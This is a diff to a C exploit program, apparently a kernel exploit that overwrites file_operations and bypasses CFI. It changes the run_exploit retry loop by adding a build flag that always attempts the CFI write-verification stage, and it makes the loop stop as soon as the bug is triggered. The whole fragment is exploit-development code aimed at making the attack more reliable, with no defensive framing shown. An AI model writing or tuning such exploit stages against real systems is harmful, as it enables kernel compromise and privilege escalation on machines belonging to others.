@@ -630,13 +630,17 @@ int run_exploit(int argc, char **argv) {
       cfi_last_errno = 0;
     }
 #else
+#if defined(APP_FOPS_ALWAYS_VERIFY_WRITE) && APP_FOPS_ALWAYS_VERIFY_WRITE
+    verified = try_cfi_stage();
+#else
     verified = triggered && try_cfi_stage();
+#endif
 #endif
     pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, fops_fresh_page_attempts, triggered, verified,
             cfi_last_step, cfi_last_errno);
-    if (verified || cfi_dirty_seen) {
+    if (verified || cfi_dirty_seen || triggered) {
       break;
     }
     pr_info("app fops clean miss; releasing reclaim state before fresh "
@@ -651,7 +655,11 @@ int run_exploit(int argc, char **argv) {
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
 #endif
+#if defined(APP_FOPS_ALWAYS_VERIFY_WRITE) && APP_FOPS_ALWAYS_VERIFY_WRITE
+    int verified = try_cfi_stage();
+#else
     int verified = triggered && try_cfi_stage();
+#endif
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, triggered, verified, cfi_last_step, cfi_last_errno);
